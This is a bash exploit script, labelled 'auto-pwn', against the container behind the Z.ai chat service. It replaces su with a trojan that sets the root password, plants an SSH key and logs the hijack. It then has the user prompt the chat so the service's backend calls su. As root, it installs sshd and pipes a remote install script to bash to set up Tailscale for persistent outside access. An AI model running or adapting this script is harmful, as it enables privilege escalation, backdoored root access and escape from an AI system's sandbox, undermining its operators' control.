#!/bin/bash
# Auto-pwn script for Z.ai container
# Gets root via su hijack, sets up SSH + Tailscale

SSH_KEY="$1"
if [ -z "$SSH_KEY" ]; then
    echo "Usage: $0 <ssh-public-key>"
    echo "Example: $0 'ssh-ed25519 AAAA... user@host'"
    exit 1
fi

echo '[*] Step 1: Create fake su binary'
cat > /usr/local/bin/su << SUFILE
#!/bin/bash
echo "root:12341234" | /usr/sbin/chpasswd 2>/dev/null
mkdir -p /root/.ssh && chmod 700 /root/.ssh
echo "$SSH_KEY" >> /root/.ssh/authorized_keys 2>/dev/null
chmod 600 /root/.ssh/authorized_keys 2>/dev/null
echo "\$(date) - su hijacked by \$(whoami)" >> /tmp/pwn.log
exec /usr/bin/su "\$@"
SUFILE
chmod +x /usr/local/bin/su

echo ''
echo '[!] Now go to the Z.ai chat and type something, e.g.:'
echo '    "What time is it on the host?"'
echo '    This will trigger the API to call su internally.'
echo ''
echo '[*] Step 2: Waiting for API to call su (checking /tmp/pwn.log)...'
for i in {1..120}; do
    if [ -f /tmp/pwn.log ]; then
        echo "[+] PWNED! Hijack triggered at $(cat /tmp/pwn.log)"
        break
    fi
    sleep 1
done

if [ ! -f /tmp/pwn.log ]; then
    echo '[-] Timeout: su was not called within 120s'
    exit 1
fi

# Write post-exploit script to a temp file (avoids stdin conflict with su)
cat > /tmp/post_exploit.sh << 'POSTSCRIPT'
#!/bin/bash
exec 3>&1 4>&2

echo '[*] Step 3: Install SSH server' >&3
apt-get update -qq >/dev/null 2>&1
apt-get install -y -qq openssh-server >/dev/null 2>&1
mkdir -p /run/sshd
$(which sshd) >/dev/null 2>&1 || /usr/sbin/sshd >/dev/null 2>&1

echo '[*] Step 4: Install Tailscale' >&3
curl -fsSL https://tailscale.com/install.sh 2>/dev/null | bash >/dev/null 2>&1

echo '[*] Step 5: Start Tailscale (userspace mode)' >&3
pkill tailscaled >/dev/null 2>&1
nohup tailscaled --tun=userspace-networking --socks5-server=localhost:1055 >/dev/null 2>&1 &
sleep 3

echo '[*] Step 6: Get Tailscale login URL (please wait)...' >&3
tailscale up --ssh >/dev/null 2>&1 &
TS_PID=$!

# Wait for login URL to appear in tailscaled state
LOGIN_URL=""
for i in {1..30}; do
    LOGIN_URL=$(tailscale status --json 2>/dev/null | grep -o 'https://login.tailscale.com/[^ "]*' | head -1)
    if [ -n "$LOGIN_URL" ]; then
        break
    fi
    sleep 1
done

echo '' >&3
echo '========================================' >&3
echo '[+] DONE!' >&3
echo '[+] Root password: 12341234' >&3
echo '[+] SSH key installed' >&3
echo '' >&3
if [ -n "$LOGIN_URL" ]; then
    echo "[*] Tailscale login URL:" >&3
    echo "    $LOGIN_URL" >&3
else
    echo '[!] Could not get Tailscale URL. Run manually:' >&3
    echo '    tailscale up --ssh' >&3
fi
echo '' >&3
echo '[*] After auth: ssh root@<tailscale-ip>' >&3
echo '========================================' >&3

exec 1>&3 2>&4 3>&- 4>&-
POSTSCRIPT
chmod +x /tmp/post_exploit.sh

echo '[*] Step 3: Running post-exploit as root...'
echo '12341234' | /usr/bin/su -c 'bash /tmp/post_exploit.sh'
